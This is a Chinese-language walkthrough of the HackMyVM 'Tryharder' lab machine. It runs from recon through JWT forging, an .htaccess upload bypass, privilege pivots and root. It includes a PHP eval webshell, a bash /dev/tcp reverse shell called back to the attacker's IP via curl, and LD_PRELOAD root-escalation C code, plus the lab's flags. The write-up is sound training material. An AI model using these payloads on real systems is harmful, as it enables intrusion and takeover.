---
layout: config.default_layout
title: HackMyVM-Tryharder
date: 2025-04-12 13:56:24
updated: 2025-04-12 13:58:02
comments: true
tags: [HackMyVM,Linux靶机,LD提权]
categories: 靶机
---

# Tryharder.

> https://hackmyvm.eu/machines/machine.php?vm=Tryharder
> 

Notes：**Hello Hacker! Try Harder!**

## 前期踩点

```bash
⚡ root@kali  ~/Desktop/test/tryharder  nmap -sP 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:23 EDT
Nmap scan report for 192.168.56.2
Host is up (0.00033s latency).
MAC Address: 08:00:27:88:A0:3E (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.41
Host is up (0.00054s latency).
MAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 15.09 seconds
```

```bash
⚡ root@kali  ~/Desktop/test/tryharder  nmap -sT -min-rate 10000 -p- 192.168.56.41       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:34 EDT
Nmap scan report for 192.168.56.41
Host is up (0.00062s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 10.32 seconds
```

```bash
⚡ root@kali  ~/Desktop/test/tryharder  nmap -sT -A -T4 -O -p 22,80 192.168.56.41        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:35 EDT
Nmap scan report for 192.168.56.41
Host is up (0.00059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: \xE8\xA5\xBF\xE6\xBA\xAA\xE6\xB9\x96\xE7\xA7\x91\xE6\x8A\x80 - \xE4\xBC\x81\xE4\xB8\x9A\xE9\x97\xA8\xE6\x88\xB7\xE7\xBD\x91\xE7\xAB\x99
MAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms 192.168.56.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.36 seconds
```

```bash
⚡ root@kali  ~/Desktop/test/tryharder  nmap -script=vuln 22,80 192.168.56.41    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:35 EDT
Failed to resolve "22,80".
Nmap scan report for 192.168.56.41
Host is up (0.00018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 37.97 seconds
```

## Web 渗透

### 信息收集

访问 HTTP，一个静态页面，什么内容都没有

![image.png](image.png)

目录扫描无结果

```bash
⚡ root@kali  ~/Desktop/test/tryharder  gobuster dir -u http://192.168.56.41 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error          
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.41
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403,502,429
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

查看一下页面源码，找到如下信息

```bash
171 /* 调试信息：API路径 /NzQyMjE= */
```

```bash
⚡ root@kali  ~/Desktop/test/tryharder  echo "NzQyMjE=" | base64 -d 
74221#  
```

访问 [`/](http://192.168.56.41/74221/)74221`

![image.png](image1.png)

扫描一下目录

```bash
⚡ root@kali  ~/Desktop/test/tryharder  gobuster dir -u http://192.168.56.41/74221 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.41/74221
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,502,429,404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 322] [--> http://192.168.56.41/74221/uploads/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

访问`uploads`文件夹，最后能到，没什么信息

![image.png](image2.png)

爆破登录页，爆破得出账号密码`test:123456`

![image.png](image3.png)

进入后台

![image.png](image4.png)

### JWT

看来权限要达到`admin` ，抓个包看看，是`JWT`

```bash
GET /74221/dashboard.php HTTP/1.1
Host: 192.168.56.41
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.56.41/74221/
Connection: keep-alive
Cookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc0NDM4NTM5N30._HNKBOpExcKvCawhRMm8mWsZaVJCAQkqNgRo1xJbjSA
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

解析一下，应该是要将`role`改为`admin`

![image.png](image5.png)

尝试爆破`JWT key` ,爆破得到 `jwtsecret123`

```bash
⚡ root@kali  ~/Desktop/test/tryharder  john --wordlist=../../Dict/SecLists-2024.3/Passwords/scraped-JWT-secrets.txt jwt               
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)
 ⚡ root@kali  ~/Desktop/test/tryharder  john --show jwt                                                                 
?:jwtsecret123

1 password hash cracked, 0 left
```

JWT Sign ，注意`sub`要改为`999` ，不然上传功能使用不了

![image.png](image6.png)

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5OTkiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NDQzODUzOTcsImlhdCI6MTc0NDM4MzMxM30.Dz7IPxJs5CLA8EQhPGYVmLZkDA3RXNar9Y2HKZvVeWs
```

### 文件上传利用

使用新的`JWT`进入后台有上传文件功能

![image.png](image7.png)

上传PHP后缀文件提示：`Only .jpg and .png  files are allowed!`

上传`.htaccess` 进行绕过

```bash
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: application/x-php

<IfModule mime_module>
	AddHandler php5-script .png          
	SetHandler application/x-httpd-php   
</IfModule>
```

然后上传 `png`后缀的`php`文件

```bash
Content-Disposition: form-data; name="file"; filename="shell.png"
Content-Type: application/x-php

<?php eval($_POST[1]);?>
```

上传成功给进行测试

![image.png](image8.png)

进行反弹`shell` ，`Kali`开启监听

```bash
nc -lvp 1234
```

```bash
1=system%28%22%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%2Fdev%2Ftcp%2F192%2E168%2E56%2E4%2F1234%200%3E%261%27%22%29%3B
```

```bash
curl http://192.168.56.41/74221/uploads/999/shell.png -X POST -d "1=system%28%22%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%2Fdev%2Ftcp%2F192%2E168%2E56%2E4%2F1234%200%3E%261%27%22%29%3B"
```

![image.png](image9.png)

读取`user.txt`

```bash
www-data@Tryharder:/home/pentester$ cat user.txt
cat user.txt
Flag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}
```

## 提权

### 提权 - pentester

先进行信息收集

在 `/etc/passwd` 中找到些有趣的东西

```bash
pentester:x:1000:1000:Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight...:/home/pentester:/bin/bash
xiix:x:1001:1001:A Tale of Two Cities:/home/xiix:/bin/bash
```

两个用户的描述为双城记的内容

![image.png](image10.png)

在`pentester`家目录存在`.note` ，`Caesar`为凯撒，粉碎凯撒，可能指的是凯撒密码

```bash
www-data@Tryharder:/home/pentester$ ls -al
ls -al
total 28
drwxr-xr-x 2 pentester pentester 4096 Mar 25 06:46 .
drwxr-xr-x 4 root      root      4096 Mar 23 10:46 ..
lrwxrwxrwx 1 root      root         9 Mar 22 08:03 .bash_history -> /dev/null
-rw-r--r-- 1 pentester pentester  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 pentester pentester 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 root      root        58 Mar 25 02:13 .note
-rw-r--r-- 1 pentester pentester  807 Apr 18  2019 .profile
-rw-r--r-- 1 pentester pentester   47 Mar 23 07:08 user.txt
www-data@Tryharder:/home/pentester$ cat .note
cat .note
Two cities clashed in tale: Smash Caesar, buddy, to pass.
```

 提到了密码，那么应该要寻找隐藏文件

```bash
www-data@Tryharder:/tmp$ find / -name '.*' 2>/dev/null | awk '!/^\/sys/'
find / -name '.*' 2>/dev/null | awk '!/^\/sys/'
/srv/...
/var/www/html/74221/uploads/999/.htaccess
/var/backups/.secret
/var/backups/.secret/.verysecret
/var/backups/.secret/.verysecret/.noooooo
/home/pentester/.profile
/home/pentester/.bashrc
/home/pentester/.bash_logout
/home/pentester/.note
/home/pentester/.bash_history
/home/xiix/.local
/home/xiix/.profile
/home/xiix/.bashrc
/home/xiix/.bash_logout
/home/xiix/.bash_history
/run/network/.ifstate.lock
/usr/src/linux-headers-4.19.0-27-amd64/.config
/usr/src/linux-headers-4.19.0-27-amd64/.kernelvariables
/etc/cron.daily/.placeholder
/etc/cron.hourly/.placeholder
/etc/cron.d/.placeholder
/etc/cron.weekly/.placeholder
/etc/cron.monthly/.placeholder
/etc/skel/.profile
/etc/skel/.bashrc
/etc/skel/.bash_logout
```

/var/backups/.secret/.verysecret/.noooooo 下还能找到一个`note2.txt`文件，依旧是和双城记有关的内容。

```bash
www-data@Tryharder:/tmp$ ls /var/backups/.secret/.verysecret/.noooooo                                                                                        ls /var/backups/.secret/.verysecret/.noooooo                                                                                                                 
note2.txt  

www-data@Tryharder:/tmp$ cat /var/backups/.secret/.verysecret/.noooooo/note2.txt        
The Compass and the Campfire                                                                                                                                 

David knelt beside his ten-year-old son, Jake, their shared backpack spilling onto the forest floor. "Lost?" Jake whispered, staring at the identical trees clawing at the twilight. David’s calloused fingers brushed the cracked compass in his palm—a relic from his father, its needle trembling like a moth. "Not lost," he lied. "Just… rerouting."        
                                                                                                                                                             
Jake’s eyes narrowed, too sharp for comfort. "Your compass is broken."        
                                                                                                                                                             
A chuckle escaped David, brittle as dry leaves. "Compasses don’t break, bud. They… forget." He flipped it open, the glass fogged with age. "See? North isn’t 
where it should be. It’s where it chooses to be tonight."                     
                                                                                                                                                             
The boy frowned, then yelped as a pinecone thudded beside him. A red squirrel chattered overhead, its tail flicking like a metronome. Jake’s fear dissolved into giggles. David watched, throat tight. He’s still young enough to laugh at squirrels.                                                                     
                                       
"Dad?" Jake unzipped his jacket, revealing three granola bars and a glowstick. "We’ve got supplies. Let’s build a fort."                                     
                                       
They wove branches into a crooked shelter, Jake’s hands steady where David’s shook. When the first stars pierced the canopy, David confessed: "Grandpa gave me this compass the day I got lost in the mall. Told me it’d always point home."                                                                              
                                       
Jake snapped the glowstick, bathing their fort in alien green. "Does it work now?"                                                                           
                                       
The needle quivered, settling northwest. Toward the distant highway hum, not their cabin’s woodsmoke. David closed the brass lid. "Nope. But you do." He nodded at Jake’s pocket—where a crumpled trail map peeked out, dotted with the boy’s doodled dinosaurs.                                                          
                                       
Dawn found them at the cabin’s porch, guided by Jake’s roars laughter and the squirrels he’d named "Sir Nibbles". The compass stayed in David’s pocket, its secret safe: true north had shifted years ago, anyway—from steel poles to a gap-toothed grin eating pancakes at 6 AM.           
```

还能扫描到存在`/srv/...` 文件

```bash
www-data@Tryharder:/tmp$ cat /srv/...
Iuwbtthfbetuoftimfs"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../
```

看着和用户`pentester` 描述很像，稍有一些字符不一样

```bash
Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight...
```

```bash
 ⚡ root@kali  ~/Desktop/test/tryharder  cat a.txt                  
Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight...
 ⚡ root@kali  ~/Desktop/test/tryharder  cat b.txt  
Iuwbtthfbetuoftimfs"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../
```

像是对比字符，相同为一个结果不相同为一个结果，这样就像是二进制数了

编写脚本

```bash
s1 = "Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight..."
s2 = "Iuwbtthfbetuoftimfs\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../"

result = "".join("0" if ch1 == ch2 else "1" for ch1, ch2 in zip(s1, s2))
print(result)
```

结果为

```bash
0101100100110000010101010101111100110101010011010011010001010011010010000011001101000100010111110011000100110111010111110011100001010101010001000100010001011001
```

将结果转换为十进制得到

```bash
Y0U_5M4SH3D_17_8UDDY
```

进行SSH登录

```bash
⚡ root@kali  ~/Desktop/test/tryharder  ssh pentester@192.168.56.41 
The authenticity of host '192.168.56.41 (192.168.56.41)' can't be established.
ED25519 key fingerprint is SHA256:rXcjV9xeZG+J6KZLTr1t2Xi2ErBvMauXjxH4EBvhV0c.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:39: [hashed name]
    ~/.ssh/known_hosts:41: [hashed name]
    ~/.ssh/known_hosts:42: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.41' (ED25519) to the list of known hosts.
pentester@Tryharder:~$ 
```

### 提权 - xiix

查看`sudo`权限，貌似可以进行提权

```bash
pentester@Tryharder:~$ sudo -l
Matching Defaults entries for pentester on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pentester may run the following commands on tryharder:
    (ALL : ALL) NOPASSWD: /usr/bin/find

```

```bash
pentester@Tryharder:~$ sudo find . -exec /bin/sh \; -quit
find: critical error - Segmentation fault (core dumped)
```

无法拿来进行提权，估计是被修改过的，难道是要我们使用其来寻找一些文件么？

```bash
pentester@Tryharder:~$ sudo find /root -name '*'
/root
/root/congrats.txt
/root/.local
/root/.local/share
/root/.local/share/nano
/root/root.txt
/root/.profile
/root/.bashrc
/root/1.c
/root/.Xauthority
/root/.bash_history
```

上传`linpeas`进行扫描，`xiix`运行着`/srv/backdoor.py`

```bash
-syslog-only                                                                                                                                                 
  └─(Caps) 0x0000000020000000=cap_audit_write                                                                                                                
root       377  0.1  0.6  19304  6228 ?        Ss   22:05   0:03 /lib/systemd/systemd-logind                                                                 
root       381  0.0  0.2   8824  2940 ?        Ss   22:05   0:00 /usr/sbin/cron -f                                                                           
root       435  0.0  0.2   9796  2640 ?        S    22:06   0:00  _ /usr/sbin/CRON -f                                                                        
xiix       436  0.0  0.0   2384   644 ?        Ss   22:06   0:00      _ /bin/sh -c /srv/backdoor.py                                                          
xiix       437  0.0  0.8  19260  8432 ?        S    22:06   0:00          _ python /srv/backdoor.py                                                          
root       387  0.0  0.1   5608  1480 tty1     Ss+  22:05   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux    
```

但是我么没有权限查看

```bash
pentester@Tryharder:/srv$ ls -al backdoor.py 
-rwx------ 1 xiix xiix 1012 Mar 23 23:42 backdoor.py
```

查看一下端口，存在一个本地访问的`8989`端口

```bash
pentester@Tryharder:/srv$ ss -tulpn
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                      
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                      
tcp                     LISTEN                   0                        5                                              127.0.0.1:8989                                            0.0.0.0:*                      
tcp                     LISTEN                   0                        128                                                    *:80                                                    *:*                      
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*   
```

访问后提示输入密码

```bash
pentester@Tryharder:/srv$ nc 127.0.0.1 8989
Enter password: 1
Access denied!
```

尝试输入之前获得的密码后得到一个shell，并且权限是`xiix` 用户的

```bash
pentester@Tryharder:/srv$ nc 127.0.0.1 8989
Enter password: Y0U_5M4SH3D_17_8UDDY
Access granted!
shell> id
uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)

shell> 
```

写入公钥

```bash
echo "xxxx" > .ssh/authorized_keys
```

使用`SSH`登录

```bash
⚡ root@kali  ~  ssh xiix@192.168.56.41   
Linux Tryharder 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
xiix@Tryharder:~$ 
```

### 提权 - root

`xiix`家目录下有一个可执行文件`guess_game` ，文件所属者是`xiix`但是没有任何办法进行更改权限，估计是使用`lsattr` 限制了

```bash
xiix@Tryharder:~$ ./guess_game 
===== 终极运气挑战 / Ultimate Luck Challenge ====
规则很简单： 我心里有个数字（0-99），你有一次机会猜。
I have a number (0-99), you get one guess.
猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！
Guess right, I’ll give your reward; wrong? Hehe, face the consequences!
提示： 聪明人也许能找到捷径。
Hint: Smart ones might find a shortcut.
输入你的猜测（0-99） / Your guess (0-99): ^C
```

貌似很危险..提示说有捷径，我直接执行

```bash
xiix@Tryharder:~$ ./guess_game 
===== 终极运气挑战 / Ultimate Luck Challenge ====
规则很简单： 我心里有个数字（0-99），你有一次机会猜。
I have a number (0-99), you get one guess.
猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！
Guess right, I’ll give your reward; wrong? Hehe, face the consequences!
提示： 聪明人也许能找到捷径。
Hint: Smart ones might find a shortcut.
输入你的猜测（0-99） / Your guess (0-99): 1
哈哈，猜错了！ / Wrong guess!
秘密数字是 34。 / Secret number: 34
正在格式化你的硬盘...（开玩笑的啦！） / Formatting disk... (Kidding!)

xiix@Tryharder:~$ ./guess_game 
===== 终极运气挑战 / Ultimate Luck Challenge ====
规则很简单： 我心里有个数字（0-99），你有一次机会猜。
I have a number (0-99), you get one guess.
猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！
Guess right, I’ll give your reward; wrong? Hehe, face the consequences!
提示： 聪明人也许能找到捷径。
Hint: Smart ones might find a shortcut.
输入你的猜测（0-99） / Your guess (0-99): 2
哈哈，猜错了！ / Wrong guess!
秘密数字是 20。 / Secret number: 20
正在格式化你的硬盘...（开玩笑的啦！） / Formatting disk... (Kidding!)
```

貌似不会做什么，并且每次数字不一样，直接暴力破解

```bash
for i in $(seq 10000);do echo 1|./guess_game ;done
```

爆破出密码`superxiix`

```bash
===== 终极运气挑战 / Ultimate Luck Challenge ====
规则很简单： 我心里有个数字（0-99），你有一次机会猜。
I have a number (0-99), you get one guess.
猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！
Guess right, I’ll give your reward; wrong? Hehe, face the consequences!
提示： 聪明人也许能找到捷径。
Hint: Smart ones might find a shortcut.
天哪！你居然猜对了！运气逆天啊！ / You got it! Amazing luck!
Pass: superxiix
```

直接 `sudo` ，`root`权限执行`whoami`…

```bash
xiix@Tryharder:~$ sudo -l
[sudo] password for xiix: 
Matching Defaults entries for xiix on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD

User xiix may run the following commands on tryharder:
    (ALL : ALL) /bin/whoami

```

```bash
xiix@Tryharder:~$ sudo whoami
root
```

将它喂给`GPT`：

> 虽然你不能直接 `sudo chmod` 或提权运行其他命令，但你有这个：
> 
> 
> ```bash
> env_keep+=LD_PRELOAD
> ```
> 
> 这在某些环境中，可能会带来 **突破口**！
> 
- `LD_PRELOAD` 可以在运行程序前强行加载你自定义的 `.so` 共享库。
- 如果这个库中实现了 `getuid()` 或其他标准函数，它就可以被优先加载、覆盖。
- 当你以 `sudo` 运行 `/bin/whoami`，就会先加载你的库，执行你指定的恶意代码！

> https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_PRELOAD#ld_preload---ld_library_path
> 

Save as **/tmp/pe.c**

```c
#include <stdio.h>#include <sys/types.h>#include <stdlib.h>void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Then **compile it** using:

```bash

cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Finally, **escalate privileges** running

```bash
sudoLD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

这样就能获得`root`权限了

```bash
xiix@Tryharder:~$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
pe.c: In function ‘_init’:
pe.c:7:5: warning: implicit declaration of function ‘setgid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
     setenv
pe.c:8:5: warning: implicit declaration of function ‘setuid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
     setenv
xiix@Tryharder:~$ sudo LD_PRELOAD=./pe.so /bin/whoami
root@Tryharder:/home/xiix# 
```

读取`root.txt`

```bash

root@Tryharder:~# cat congrats.txt 
        ____  ____  ____  ____  ____  ____  ____  ____  ____  ____  _  
       /    \/    \/    \/    \/    \/    \/    \/    \/    \/    \/ \ 
      /_______________________________________________________________\
      |                                                               |
      |  *** CONGRATULATIONS! YOU'VE CONQUERED THE TARGET RANGE! ***  |
      |_______________________________________________________________|

   YOU ARE A TRUE HACKER LEGEND!
   The Xiixhu Tech bows to your skills!

   What's Next?
   - Join our elite crew!
   - QQ Group: 660930334
   - Welcome aboard, mastermind!

   Try Harder!
   Keep hacking, keep winning!

   [ Tip: Root password is hidden in the congrats message! Dig deeper! ]
root@Tryharder:~# cat root.txt 
Flag{7ca62df5c884cd9a5e5e9602fe01b39f9ebd8c6f}
```